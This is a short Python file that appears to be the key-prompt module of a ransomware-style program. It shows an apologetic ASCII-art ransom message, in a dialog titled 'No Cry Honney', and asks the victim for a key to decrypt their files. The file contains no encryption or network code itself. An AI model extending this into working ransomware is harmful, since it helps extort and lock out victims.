import os
import sys

def get_key():
    """Detecta se há um ambiente gráfico disponível e solicita a chave de forma apropriada."""

    ascii_key_lock = """
.......................................
............_.-----._...Sorry ;-;......
.........../  _   _  \.................
........../  (9) (9)  \................
........./_,         ,_\...............
.........| \         /  |..............
...._.....\ \._____./   /..__..........
...\`\.....\  \___/    / _|  \.........
....\ `\.../\         /\ \   /.........
.....|  `\/ /`'-----'`\ \/  /..........
.....|_|\/ /           \   /...........
...../    /|           |\_/............
.....\___/ |           | \.............
......\ .  |           |  \............
.......\|  |           |  |............
........|  `.         .'  |............
........\    `-.___.-'    /............
.........`\       |      /.............
...........\     |      /..............
........-.-.`\   |    /'.-.-...........
.......(,(,(,`^   |   ^`,),),).........
.......'-'-'-----`-----'-'-'...........
.......................................
"""

    message = (
        f"{ascii_key_lock}\n"
        "Me desculpa, prometo que vai ser rápido\n\n"
        "Por favor, insira a chave de descriptografia abaixo para continuar."
    )

    # Verifica se está no Windows ou se a variável DISPLAY está definida
    if os.name == 'nt' or os.environ.get('DISPLAY'):
        try:
            # Tenta usar a interface gráfica
            import tkinter as tk
            from tkinter import simpledialog

            root = tk.Tk()
            root.withdraw()  # Oculta a janela principal
            key = simpledialog.askstring("No Cry Honney", message)
            if key is None:
                print("Nenhuma chave fornecida. A operação foi cancelada.")
                sys.exit(1)
            return key
        except Exception as e:
            print(f"Erro ao inicializar a interface gráfica: {e}")
            print("Mudando para entrada via terminal.")
    
    # Caso não tenha ambiente gráfico, usa o terminal
    print(message)
    return input("Digite a chave para descriptografar os arquivos: ")
